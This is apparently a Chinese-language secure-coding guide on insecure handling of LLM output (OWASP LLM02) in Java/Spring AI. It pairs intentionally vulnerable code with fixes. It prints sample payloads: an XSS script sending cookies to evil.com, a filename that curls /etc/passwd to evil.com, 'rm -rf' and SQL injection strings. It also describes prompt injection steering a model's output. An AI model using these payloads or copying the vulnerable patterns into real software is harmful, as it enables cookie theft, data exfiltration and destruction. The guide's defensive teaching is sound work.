---
id: LLM-OUTPUT-HANDLING
name: LLM 不安全输出处理
severity: high
owasp_llm: "LLM02"
cwe: ["CWE-79", "CWE-94"]
category: llm
frameworks: ["Spring AI", LangChain4j, ScriptEngine]
last_updated: "2026-04-18"
doc_version: "1.0"
---

# LLM 不安全输出处理

> 最后更新：2026-04-18

## 概述

LLM 不安全输出处理（Insecure LLM Output Handling）指应用程序对大语言模型（LLM）生成的输出未进行充分验证和净化，就直接将其传递给下游系统或用户界面。由于 LLM 输出可以被提示词注入等方式操控，未经验证的输出可能导致 XSS、命令注入、SQL 注入等二次注入攻击。

与 Prompt 注入（LLM01）不同，本漏洞关注的是对 LLM 输出的不当处理，而非对 LLM 输入的操纵。

## 风险等级

| 维度 | 评级 |
|------|------|
| OWASP LLM Top 10 | LLM02 - Insecure Output Handling |
| CWE | CWE-79 / CWE-94 |
| 严重程度 | 高危 |

## 攻击类型

### 1. XSS 通过 LLM 输出

攻击者通过 Prompt 注入使 LLM 生成包含恶意 JavaScript 的 HTML 内容，应用未转义输出导致 XSS。

```
用户输入：请生成一个用户欢迎页面，用户名是 <script>fetch('https://evil.com/steal?c='+document.cookie)</script>
LLM 输出：<h1>欢迎，<script>fetch('https://evil.com/steal?c='+document.cookie)</script></h1>
```

### 2. 命令注入通过 LLM 输出

LLM 生成的输出被直接传递给系统命令执行接口，导致命令注入。

```
LLM 输出被传递给 Runtime.exec()：
文件名：test; rm -rf /tmp
```

### 3. SQL 注入通过 LLM 输出

LLM 生成的查询参数被直接拼接到 SQL 语句中，导致 SQL 注入。

```
LLM 生成的搜索条件：' OR '1'='1' --
```

### 4. 不安全的动态代码执行

LLM 生成的代码片段被直接传入 ScriptEngine、GroovyShell 等执行引擎，导致任意代码执行。

```
LLM 生成代码并传递给 eval()：
Runtime.getRuntime().exec("calc")
```

## Java场景

### [VULNERABLE] LLM 输出直接渲染为 HTML

```java
// [VULNERABLE] Spring AI 将 LLM 输出直接返回前端渲染
import org.springframework.ai.chat.client.ChatClient;
import org.springframework.web.bind.annotation.*;

@RestController
public class LlmOutputVulnerableController {

    private final ChatClient chatClient;

    // [VULNERABLE] 此方法存在不安全输出处理漏洞，原因：LLM 输出未编码直接返回
    @GetMapping("/chat")
    public String chat(@RequestParam String message) {
        String response = chatClient.prompt()
            .user(message)
            .call()
            .content();
        // 漏洞：LLM 输出可能包含恶意 HTML/JS，前端使用 v-html 或 th:utext 渲染
        return response;
    }
}
```

### [VULNERABLE] LLM 输出直接传入命令执行

```java
// [VULNERABLE] LLM 生成文件名后直接用于系统命令
import org.springframework.ai.chat.client.ChatClient;

public class LlmOutputVulnerableService {

    private final ChatClient chatClient;

    // [VULNERABLE] 此方法存在不安全输出处理漏洞，原因：LLM 输出用于系统命令
    public String generateReport(String description) {
        String filename = chatClient.prompt()
            .user("根据描述生成报告文件名：" + description)
            .call()
            .content()
            .trim();

        // 漏洞：LLM 生成的文件名可能包含命令注入 payload
        // 如 "report; curl https://evil.com/exfil?data=$(cat /etc/passwd)"
        try {
            Process process = Runtime.getRuntime().exec("generate-report " + filename);
            return "Report generated: " + filename;
        } catch (IOException e) {
            return "Error: " + e.getMessage();
        }
    }
}
```

### [SECURE] LLM 输出编码与沙箱执行

```java
// [SECURE] 对 LLM 输出进行严格验证和编码
import org.springframework.ai.chat.client.ChatClient;
import org.springframework.web.bind.annotation.*;
import org.owasp.encoder.Encode;

@RestController
public class LlmOutputSecureController {

    private final ChatClient chatClient;

    // [SECURE] 修复了不安全输出处理漏洞，修复方式：输出编码 + 内容安全策略
    @GetMapping("/chat")
    public ChatResponse chat(@RequestParam String message) {
        String response = chatClient.prompt()
            .user(message)
            .call()
            .content();

        // 安全 1：对 LLM 输出进行 HTML 编码，防止 XSS
        String safeResponse = Encode.forHtmlContent(response);

        // 安全 2：返回结构化响应，前端使用 textContent 而非 innerHTML
        return new ChatResponse(safeResponse);
    }

    // [SECURE] LLM 输出用于系统操作时进行严格验证
    public String generateReport(String description) {
        String filename = chatClient.prompt()
            .user("根据描述生成报告文件名，只返回文件名：" + description)
            .call()
            .content()
            .trim();

        // 安全 3：使用白名单正则验证 LLM 输出格式
        if (!filename.matches("^[a-zA-Z0-9_\\-]{1,64}\\.pdf$")) {
            throw new IllegalArgumentException("Invalid filename generated");
        }

        // 安全 4：使用参数化 ProcessBuilder 避免 shell 注入
        ProcessBuilder pb = new ProcessBuilder("generate-report", filename);
        try {
            pb.start();
            return "Report generated: " + filename;
        } catch (IOException e) {
            throw new RuntimeException("Report generation failed", e);
        }
    }
}

record ChatResponse(String content) {}
```

## 检测方法

1. **静态分析**：扫描 LLM 输出传递给危险接收方的代码路径，如 `th:utext`、`Runtime.exec()`、`ScriptEngine.eval()`、SQL 拼接
2. **动态测试**：通过 Prompt 注入使 LLM 生成恶意输出，验证下游系统是否正确处理
3. **数据流分析**：追踪 LLM 输出从生成到最终消费的完整数据流，识别未经验证的中间环节
4. **输出模式检测**：使用正则表达式检测 LLM 输出中是否包含 HTML 标签、SQL 关键字、shell 命令等可疑内容

## 防护措施

1. **输出编码**：对 LLM 输出在渲染到 HTML 前进行适当的编码（HTML/JavaScript/URL 编码）
2. **内容安全策略**：配置严格的 CSP 头，限制内联脚本执行
3. **输出验证**：对 LLM 输出进行白名单格式校验后再传递给下游系统
4. **沙箱执行**：如果 LLM 输出需要被执行（如代码生成），在沙箱环境中运行
5. **指令隔离**：在系统 Prompt 中明确指示 LLM 不要生成特定格式的内容

## 参考资料

- [OWASP LLM Top 10 - LLM02](https://owasp.org/www-project-top-10-for-large-language-model-applications/)
- [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)
- [Spring AI Security](https://docs.spring.io/spring-ai/reference/security.html)
- [OWASP LLM Output Handling Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/LLM_Output_Handling_Cheat_Sheet.html)
